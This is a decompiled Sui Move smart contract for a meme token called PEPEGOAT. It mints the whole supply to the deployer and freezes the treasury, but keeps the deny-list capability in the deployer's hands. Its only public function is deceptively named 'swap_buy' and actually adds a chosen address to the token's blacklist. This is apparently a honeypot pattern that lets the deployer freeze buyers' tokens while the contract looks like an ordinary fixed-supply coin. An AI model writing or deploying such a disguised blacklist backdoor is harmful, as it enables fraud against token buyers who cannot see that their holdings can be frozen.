module 0xd3df74a3919ddb61907bfd10f1cbe2106c4db5e762267e606cb368b137d31ada::pepegoat {
    struct PEPEGOAT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PEPEGOAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PEPEGOAT>(arg0, 9, b"PEPEGOAT", b"Goatseus Pepesimus", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmcXVvGMXy7rwsmVc5NEKcpdVhbNnPEkKTqiXRSwXLTozy"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PEPEGOAT>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PEPEGOAT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PEPEGOAT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PEPEGOAT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEPEGOAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PEPEGOAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

